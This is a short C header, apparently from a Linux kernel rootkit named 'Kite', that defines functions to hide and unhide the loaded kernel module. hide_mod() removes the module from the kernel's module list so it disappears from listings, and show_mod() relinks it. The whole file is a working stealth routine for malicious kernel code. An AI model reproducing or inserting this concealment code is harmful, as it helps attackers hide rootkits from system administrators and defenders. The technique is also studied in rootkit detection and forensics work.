#ifndef KITE_HIDER
    #define KITE_HIDER

static int hidden = 0; // flag if module is hidden
static struct list_head *prev_module;


static void show_mod(void) {
    //add to the modules linked list the current module after the one it already had been attached
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}


static void hide_mod(void) {
    // keep the module that this module is attached to after in the modules linked list, to reattach later
    prev_module = THIS_MODULE->list.prev;
    // delete this module from the list by linking previous module to the next(thats behind the scenes)
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

#endif
